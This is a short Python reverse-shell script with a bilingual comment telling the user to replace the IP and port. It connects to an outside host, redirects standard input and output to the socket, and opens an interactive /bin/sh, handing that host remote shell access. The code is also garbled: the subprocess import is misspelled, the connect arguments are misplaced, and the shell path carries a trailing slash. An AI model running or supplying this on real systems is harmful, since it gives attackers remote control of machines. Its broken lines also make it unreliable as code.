# python-shell-tcp
import subpreocess,os,socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#替换ip和port(Replace IP and port)
#-----------↓----------
s.connect(('ip'),port)
#-----------------↑---
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh/","-i"])